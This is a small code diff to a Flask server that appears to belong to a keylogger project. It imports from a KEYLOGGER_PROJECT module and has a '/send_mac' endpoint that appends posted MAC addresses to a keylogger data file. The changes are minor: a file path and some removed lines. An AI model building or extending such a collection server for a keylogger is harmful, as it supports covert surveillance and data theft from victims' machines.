@@ -11,7 +11,6 @@ from KEYLOGGER_PROJECT.Encrypt_Decrypt.decrypt_file import Decrypt
 app = Flask(__name__)
 CORS(app)
 
-mac_addresses = []
 
 @app.route('/', methods=['GET'])
 def hello():
@@ -42,7 +41,7 @@ def add_data():
 @app.route('/send_mac', methods=['POST'])
 def send_mac():
     data = request.data
-    with open(r'/keylogger_data/mac_addresses.json', 'a') as f:
+    with open(r'C:\Users\User\Desktop/keylogger_data/mac_addresses.json', 'a') as f:
         f.write(data.decode()+'\n')
         print(data.decode())
     return jsonify({'post':'successful'}), 200
@@ -51,4 +50,3 @@ def send_mac():
 
 
 app.run(debug=True)
-# time.sleep(30)
